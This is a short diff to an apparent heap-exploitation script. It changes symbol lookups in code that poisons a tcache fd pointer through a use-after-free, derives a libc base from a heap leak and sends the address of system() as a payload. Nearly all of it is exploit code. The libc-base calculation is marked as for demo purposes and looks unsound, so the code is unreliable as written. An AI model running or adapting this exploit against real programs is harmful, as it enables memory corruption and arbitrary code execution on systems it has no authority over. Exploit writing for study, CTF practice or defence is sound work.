@@ -51,7 +51,7 @@ print("[+] Step 4: Poisoning tcache fd pointer...")
 
 # Analyze binary to get dynamic target address
 let elf = analyze(binary)
-let target_addr = elf["symbols"]["target"]  # Or use GOT/PLT entry dynamically
+let target_addr = elf.symbols.target  # Or use GOT/PLT entry dynamically
 
 # Allocate chunk, free it, then use UAF to poison fd
 alloc(0x80, "VICTIM")
@@ -81,7 +81,7 @@ let libc_template = Libc("ubuntu20.04")
 # For demo purposes, showing dynamic calculation pattern
 let libc_base = heap_leak & 0xfffffffffffff000  # Align to page
 let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
-let system = libc_resolved["symbols"]["system"]
+let system = libc_resolved.symbols.system
 let payload = p64(system)
 
 send(conn, "4")
